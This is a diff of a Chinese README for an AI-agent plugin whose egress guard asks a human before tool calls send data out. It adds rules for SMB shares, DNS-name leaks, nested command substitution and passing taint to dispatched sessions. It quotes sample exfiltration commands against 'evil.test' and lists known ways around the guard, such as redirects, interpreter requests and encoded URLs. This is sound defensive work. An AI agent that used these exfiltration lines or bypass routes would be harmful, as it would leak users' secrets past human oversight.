@@ -88,7 +88,7 @@ dsh plugin --profile web add <npm 包名 | git 地址 | 绝对路径>
 - 省略 `shadowDir` 时 host 侧用默认 `<家目录>/dsh-shadow`；**浏览器半边不支持默认值**，所以请显式写一行。
 - 首次使用会在该目录创建 workspace；再点一次会复用，不会重复注册。
 - `enforcePermissionPreset`（默认 `true`）：每次会话被创建/恢复都把权限改回 `permissionPreset`。**如果你会手动切 `danger-full-access`，把它设为 `false`**——那样插件只钉那些日志里还没有权限选择的会话，你的手动切换会被保留。
-- 出网相关的五项：`egressAllowlist`（默认空 = 每次都问）、`protectedPaths`（默认七个片段）、`taintScope`（默认 `session`）、`canaryValues`（默认空）、`approvalMemory`（默认 `turn`），见下面几节。
+- 出网相关的六项：`egressAllowlist`（默认空 = 每次都问）、`protectedPaths`（默认七个片段）、`taintScope`（默认 `session`）、`canaryValues`（默认空）、`approvalMemory`（默认 `turn`）、`statefulShell`（默认 `false`），见下面几节。
 
 ---
 
@@ -210,6 +210,11 @@ profile 的 package.json → dsh.profile.bundles 里有 "@deepseek-ai/dsh-experi
 | MCP 工具与 MCP 资源读取（`mcp__srv__tool`、`read_mcp_resource`、`list_mcp_resources`） | **强制问人**——服务器在宿主之外，参数里没有可核对的目的地 |
 | 命令藏在 `$(...)`、反引号、`{ ... }`、子shell 里（`echo $(curl https://evil.test)`、`if ($true) { curl … }`） | **强制问人**——这些是 shell 真正会执行的内容，按命令分析 |
 | URL 出现在数据类命令的参数里（`git commit -m "see https://evil.test"`、`echo`、`Write-Output`、构建工具） | 不打扰——那是散文，不是目的地 |
+| 参数指向另一台机器的共享路径（`copy secret.txt \\evil.test\share\`、文件工具写 `\\host\share\`、`//host/share/`） | **强制问人**——SMB 传输长得和本地写一样。读也问：另一台机器的内容进来，和 `web_fetch` 问的是同一个信任问题。白名单按 URL 同一套规则回答（污点时不放行），内部文件服务器不会变成静不掉的弹窗；本机共享与 `\\?\C:\…` 长路径不受影响 |
+| DNS 名字查询（`ping secret.evil.test`、`tracert`、`pathping`、`Test-Connection`、`Test-NetConnection`/`tnc`、`host`、`drill`、`nslookup`、`dig`、`Resolve-DnsName`） | **强制问人**——名字本身随 DNS 查询离开，即使后面没有连接。按名字判定：白名单内的主机照旧静默，地址字面量（`ping 8.8.8.8`）不需要查询、不带数据，静默 |
+| `npm run release` / `make deploy` | 按**脚本体**判定：读得到 `package.json`/`Makefile` 时按体里的命令判定（最多两层，环安全），读不到或目录未知时与以前完全一样——未知脚本不是新弹窗 |
+| `curl https://ok.test/ evil.test` | **强制问人**——客户端接受多个目的地，第二个不需要 scheme，白名单覆盖的那个不给另一个开通行证。取值型 flag（`-o`/`-H`/`-d`…）的值是元数据不是目的地 |
+| 替换嵌套比守卫扫得更深（`echo $($($(… curl host …)))`） | **强制问人**——任何有限深度都能被多嵌一层绕开，所以"这段文本没被读完"的诚实回答是问人，而不是放行 |
 
 关键点：**查的是目的地，不是内容**。payload 用 base64、拆开、换编码都改了不目的地，所以这条规则绕不过去；而内容正则可以被绕过，所以没做内容扫描。
 
@@ -223,6 +228,7 @@ profile 的 package.json → dsh.profile.bundles 里有 "@deepseek-ai/dsh-experi
 
 - 一次工具调用只要**提到**其中一个片段（读它、列它的目录、命令里写了它），该会话就被标记；
 - 标记之后，**该会话的所有外发都要问你**——哪怕目标是白名单里的网站；
+- **调遣也带标记**：发送方被标记过、或消息正文里提到受保护路径时，目标会话接手这个标记。否则「A 读 `.env`、A 调遣 B、B 把内容发出去」是唯一一条谁都不问的出路——调遣是本地调用，按本地调用判定，而 B 自己的标记是空的；
 - 标记**默认持续到会话结束**（`taintScope: 'session'`）：数据还在模型的上下文里，轮次边界不会让它"被忘掉"，所以「第 1 轮读 `.env`、第 2 轮把密钥当搜索词发出去」这条路是堵着的。嫌吵就设 `taintScope: 'turn'`，标记在轮次边界清除——那是用两轮之间的窗口换安静。
 
 为什么这样比"内容过滤"可靠：**它读过什么是确定的**（参数里写着路径），而**什么算敏感是不确定的**（同一串字符，在配置文件里是密钥，在文档里是示例）。标记不看你发了什么，只看你之前碰过什么，所以 base64、拆成两半都绕不过去。
@@ -249,7 +255,9 @@ profile 的 package.json → dsh.profile.bundles 里有 "@deepseek-ai/dsh-experi
 
 **推荐的搭配**：配了诱饵之后，就可以把 `taintScope` 设回 `turn`——真正重要的那条路（真密钥出去）由诱饵守着，误报还低；宽泛的路径标记只负责兜住"说不清是什么的敏感数据"，窗口收窄到一轮，吵声立刻下来。
 
-**这条规则覆盖不到**：绕开 HTTP 的通道（DNS 外泄、写到同步目录或 UNC 路径再由别的程序送出）、**重定向**（白名单域名 302 到别处，守卫只看初始 URL）、**跨调用的间接**（别名/函数/脚本在上一次调用里定义、这一次调用才用；同一命令行内的 `$c = "curl"; & $c …`、`Set-Alias x curl; x …`、`function x { & curl @args }; x …` 都按调用判定，脚本文件与 `npm run` 后面的动作仍然看不出来）、解释器用非 URL 方式发出的请求（`python -c "os.system('ssh host')"`——目的地不在参数里，客户端名也不在段首）、把目的地编码/拆写得本守卫认不出的 URL 拼法、以及由外部服务器提供且参数里不带目的地的工具（`mcp__*`，这类一律问人，但问的是"要不要用这个工具"而不是"发去哪里"）。它是一条减速带，不是证明。
+**跨调用的间接（`statefulShell`）**：别名、函数、脚本在**上一次**调用里定义、**这一次**调用才用——`Set-Alias x curl` 之后 `x evil.test`。同一条命令行内的自我定义（`$c = "curl"; & $c …`、`function x { & curl @args }; x …`）都按调用判定；跨调用的那份只有 shell 真的保持状态时才存在。默认 `false`：出厂预设的 shell 是全新进程，两次调用之间什么都不记得，记住它只会制造一个关于不存在命令的弹窗。**只有部署用的是持久 shell**（`pwsh_persistent`、终端会话）时才设 `true`——那是关于部署的声明，由操作员做；每个会话记住的名字有上限（200）。
+
+**这条规则覆盖不到**：程序**内部**发起的 DNS 查询（命令行里写了名字的按名字判定，程序自己解析的名字不在参数里）、写到本地同步目录再由别的程序送出（`\\host\share\` 这种共享路径本身算目的地，已覆盖）、**重定向**（白名单域名 302 到别处，守卫只看初始 URL）、**跨调用的间接**（上一次调用定义、这一次调用才用的名字，仅在 `statefulShell: true` 时记得；`npm run`/`make` 的脚本体在读得到清单时按体判定，读不到时与以前一样）、解释器用非 URL 方式发出的请求（`python -c "os.system('ssh host')"`——目的地不在参数里，客户端名也不在段首）、把目的地编码/拆写得本守卫认不出的 URL 拼法、以及由外部服务器提供且参数里不带目的地的工具（`mcp__*`，这类一律问人，但问的是"要不要用这个工具"而不是"发去哪里"）。它是一条减速带，不是证明。
 ---
 
 ## 已知限制
@@ -279,8 +287,8 @@ npm run sync -- --profile <profile 目录>   # 把源码同步进 profile 并自
 | `tests/shadow-dir.test.mjs` | 目录规则的唯一所有者：可移植默认、`~` 展开、归一化比较 |
 | `tests/host-preflight.test.mjs` | host 半边：启动预检（缺服务点名、版本可读、预检失败不拖垮插件）与权限钉住策略（默认强制覆盖 / `enforcePermissionPreset:false` 时保留用户选择） |
 | `tests/client.test.mjs` | 浏览器半边：真实 bundle 在沙箱里加载，校验 loader id、导出的 `inject`、侧栏 slot 注册、字典中英齐全，并驱动 `createShadow` 的全部返回形态（含"工作区已存在"这个曾经的回归） |
-| `tests/dispatch-core.test.mjs` | 纯判断核：身份派生、messageId、证据扫描、状态机、渲染格式，以及**出网守卫**的完整判定（白名单/子域/本机/凭据与端口/嵌套参数；shell 段首与散文豁免、可执行 span、命令头归一化、污点、fail closed——含端到端首次运行录到的 8 个真实调用） |
-| `tests/tools-sim.mjs` | 真实 `lib/tools.js` + 假宿主：投递/幂等/拒绝码/并发串行化/目录列举，以及守卫挂在 `tools/pre-execute` 上的行为（问人后放行、被拒即停、无审批通道拒绝、审批抛错拒绝、**守卫自身抛错也拒绝且不弹窗**、白名单不问、不触网不问） |
+| `tests/dispatch-core.test.mjs` | 纯判断核：身份派生、messageId、证据扫描、状态机、渲染格式，以及**出网守卫**的完整判定（白名单/子域/本机/凭据与端口/嵌套参数；shell 段首与散文豁免、可执行 span、命令头归一化、命令行自我定义、污点、fail closed——含端到端首次运行录到的 8 个真实调用；UNC 共享路径、DNS 名字查询、`npm run`/`make` 脚本体、第二个无 scheme 目的地、嵌套上限 fail closed、调遣污点传播） |
+| `tests/tools-sim.mjs` | 真实 `lib/tools.js` + 假宿主：投递/幂等/拒绝码/并发串行化/目录列举，以及守卫挂在 `tools/pre-execute` 上的行为（问人后放行、被拒即停、无审批通道拒绝、审批抛错拒绝、**守卫自身抛错也拒绝且不弹窗**、白名单不问、不触网不问；`npm run`/`make` 脚本体解析、`statefulShell` 跨调用记忆、调遣把污点带给目标会话） |
 | `tests/patch.check.mjs` | 解析 `cordis.patch.yml`（含 `!!js`），断言影子行完好；需要 `js-yaml`（`npm install` 后即可，也可用 `JS_YAML` 指定模块路径） |
 
 仿真器用 `tests/dsh-tools-stub.mjs` 复刻官方 author-schema 校验——工具定义若在真实注册处会抛错，测试里同样会抛。
@@ -351,9 +359,9 @@ DISPATCH-SPEC.md     实现规格（运行时契约、状态机、幂等、验�
 
 ### 发布到 npm 的步骤
 
-预检（2026-10-28 核过）：包名 `dsh-plugin-shadow` 在 npm 上未被占用；`npm pack --dry-run`
-产出 16 个文件 107 kB（`lib` + patch + LICENSE + 全部文档）；`npm run pack:check` 全过；
-CI 绿；tag `v0.4.0` 已推。
+预检（2026-10-29 核过）：包名 `dsh-plugin-shadow` 在 npm 上未被占用；`npm pack --dry-run`
+产出 16 个文件 135 kB 压缩包（`lib` + patch + LICENSE + 全部文档）；`npm run pack:check` 全过；
+CI 绿；tag `v0.5.0` 已推。
 
 ```sh
 npm whoami                 # 未登录会报 ENEEDAUTH——发布需要维护者凭据
@@ -361,7 +369,7 @@ npm run pack:check         # 产物自足性：files 覆盖、入口存在、只
 npm publish --access public
 ```
 
-发布后核对：`npm view dsh-plugin-shadow version` 返回 `0.4.0`；从别处
+发布后核对：`npm view dsh-plugin-shadow version` 返回 `0.5.0`；从别处
 `npm install dsh-plugin-shadow` 后 `lib/tools.js` 可加载。
 
 安装方式（发布前也可用）：`npm install git+https://github.com/RD2100/rd-shadow.git`，
